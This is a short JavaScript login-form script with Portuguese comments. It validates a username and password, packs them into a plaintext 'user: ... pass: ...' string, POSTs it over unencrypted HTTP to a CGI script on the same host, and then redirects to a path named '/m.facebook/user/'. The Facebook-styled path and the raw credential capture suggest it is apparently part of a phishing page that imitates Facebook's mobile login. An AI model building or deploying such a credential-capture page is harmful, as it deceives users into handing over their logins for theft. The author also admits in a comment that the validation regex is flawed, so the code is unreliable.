/*
*
*	author: roberto.deev@gmail.com © 2021 
*
*/

var _appRt_functions = ()=>{
	var chkNM = ()=> {
		var  _user = document.getElementById('_user-name');
        var _phone = /\+\d{7,15}/; var _ctrl = 0;
        var _email = /([a-z-0-9_.^%]){5,10}[\@][a-z]{3,10}\.com/;
        /*
			regex, está com falhas, caso o usuário ensira o caracter
			%, a autentificação terá efeitos inesperados..
			
        */

		if (_phone.exec(_user.value) == null ) _ctrl +=1;
		if (_email.exec(_user.value) == null ) _ctrl +=1;
		
		return (_ctrl === 2 ) ? -1 : 1;
	};

	var chkPW = ()=>{
		var  _pass = document.getElementById('_user-pass');
		var  _pswd = /([a-z-A-Z-0-9]){8,32}/;
		if ( _pswd.exec(_pass.value) == null ) return -1;
		return 1;
	}

	return {chkNM,chkPW}
};


var _app_validations = ()=>{
	
	var _RootFC = _appRt_functions();
	
	var parsePw = ()=>{
		var _pass = document.getElementById('_user-pass').value;
		var _user = document.getElementById('_user-name').value;
      
		var _parsed = `user: ${_user} pass: ${_pass} `;
		return encodeURI(_parsed);
	};


	var valid = ()=>{

		if ( _RootFC.chkNM() === -1 ) {_appIN.chkDT(1); return 0;}
		if ( _RootFC.chkPW() === -1 ) {_appIN.chkDT(2); return 0;}

		var _request = new XMLHttpRequest();
		var _host = window.location.host;
		_request.open('POST',"http://"+_host+'/cgi-bin/index.pl');
		
		_request.onreadystatechange = function (){
			if (this.readyState === 4 && this.status === 404){_appIN.chkDT(1); return 0;}
			if (this.readyState === 4 && this.status === 401){_appIN.chkDT(2); return 0;}
			if (this.readyState === 4 && this.status === 200){
				window.location.href = 'http://'+_host+'/m.facebook/user/';
			}
		};
		_request.send(parsePw());
	};
	return {valid}
}





